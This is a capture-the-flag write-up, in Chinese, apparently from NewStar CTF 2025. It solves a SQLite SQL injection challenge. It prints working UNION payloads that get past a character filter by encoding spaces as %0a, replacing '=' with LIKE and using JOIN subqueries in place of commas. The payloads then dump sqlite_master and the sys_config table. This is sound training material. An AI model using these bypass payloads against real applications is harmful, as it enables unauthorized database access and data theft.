---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

<script setup>
import Container from '@/components/docs/Container.vue'
</script>

# 小 E 的管理系统

<Container type='info'>

本题考查基本的 SQL 注入绕过。
</Container>

SQL 注入<span data-desc>（SQL Injection）</span>是一种常见的网络攻击手段，攻击者通过在输入字段或请求中注入恶意的 SQL 语句，操控数据库执行意图之外的操作。

此处由于使用了 SQL 语句拼接，导致了可以被 SQL 注入。

## fuzz

由于题目没有给源码，不知道具体过滤方式，需要 fuzz 一下

发现过滤了 `['#', '--', ';',' ',"'",'"','=','/']`

以及部分函数 `/(char|hex|ascii|substr|substring|mid)\s*\(/i`

## union

对空格的过滤可以用换行符绕过，URL 编码就是 `%0a`。等号可以用 LIKE 绕过

虽然过滤了 `#` 和 `--`，但是测试发现不需要注释掉末尾语句，猜测拼接在 sql 语句最后

过滤了 `'` 和 `"`，但是测试可以发现闭合语句不需要引号

过滤了 `;` 所以不能堆叠注入

最终考虑使用 UNION 联合注入<span data-desc>（通过 UNION 将攻击者构造的查询结果与合法查询结果合并，从而获取敏感数据）</span>

## 行数

UNION 联合注入要求 union 的语句输出的行数与原本语句输出的行数一致，正常情况需要用逗号测试出行数

```sql
UNION SELECT 1,2
```

但是这里过滤了逗号，需要用 JOIN 来绕过

```sql
UNION SELECT * FROM (SELECT 1) JOIN (SELECT 2)
```

将空格替换为 `%0a`，逐一测试，当正常返回代表行数正确，最终测试出行数为 5 行

```sql
1%0aUNION%0aSELECT*FROM%0a(SELECT%0a1)JOIN(SELECT%0a2)JOIN(SELECT%0a3)JOIN(SELECT%0a4)JOIN(SELECT%0a5)
--  1 UNION SELECT * FROM (SELECT 1)JOIN(SELECT 2)JOIN(SELECT 3)JOIN(SELECT 4)JOIN(SELECT 5)
```

## 表

测试出行数后，需要挑选一行替换为我们需要查询的语句

我们需要先查询有哪些表。正常 SQL 查看有哪些表可以用

```sql
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema LIKE database()
```

编码后发送

```sql
1%0AUNION%0ASELECT*FROM%0A(SELECT%0A1)JOIN(SELECT%0AGROUP_CONCAT(table_name)%0AFROM%0Ainformation_schema.tables%0AWHERE%0Atable_schema%0ALIKE%0Adatabase())JOIN(SELECT%0A3)JOIN(SELECT%0A4)JOIN(SELECT%0A5)
```

但是返回 `{"error":"database error: Unable to prepare statement: 1, no such table: information_schema.tables"}`，可以推测是 sqlite 数据库。查询 SQLite 的系统表 `sqlite_master` 即可

```sql
1%0aUNION%0aSELECT*FROM%0a(SELECT%0a1)JOIN(SELECT%0aGROUP_CONCAT(name)%0aFROM%0asqlite_master)JOIN(SELECT%0a3)JOIN(SELECT%0a4)JOIN(SELECT%0a5)
```

成功返回

```json
{
  "id": 1,
  "cpu": "node_status,sys_config,sqlite_autoindex_sys_config_1,sqlite_sequence",
  "ram": 3,
  "status": 4,
  "lastChecked": 5
}
```

## 表结构

查看表结构

```sql
1%0aUNION%0aSELECT*FROM%0a(SELECT%0a1)JOIN(SELECT%0aGROUP_CONCAT(sql)%0aFROM%0asqlite_master)JOIN(SELECT%0a3)JOIN(SELECT%0a4)JOIN(SELECT%0a5)
```

返回

```json
{
  "id": 1,
  "cpu": "CREATE TABLE node_status (\n    node_id INTEGER PRIMARY KEY,\n    cpu_usage VARCHAR(10),\n    ram_usage VARCHAR(10),\n    status VARCHAR(15) CHECK(status IN ('Online','Offline','Maintenance')),\n    last_checked DATETIME DEFAULT CURRENT_TIMESTAMP\n),CREATE TABLE sys_config (\n    id INTEGER PRIMARY KEY AUTOINCREMENT,\n    config_key VARCHAR(50) UNIQUE,\n    config_value TEXT\n),CREATE TABLE sqlite_sequence(name,seq)",
  "ram": 3,
  "status": 4,
  "lastChecked": 5
}
```

可以看到 sys_config 中有 config_key 以及 config_value

## flag

查看 config_value

```sql
1%0aUNION%0aSELECT*FROM%0a(SELECT%0a1)JOIN(SELECT%0aGROUP_CONCAT(config_value)%0aFROM%0asys_config)JOIN(SELECT%0a3)JOIN(SELECT%0a4)JOIN(SELECT%0a5)
```

即可获取 flag
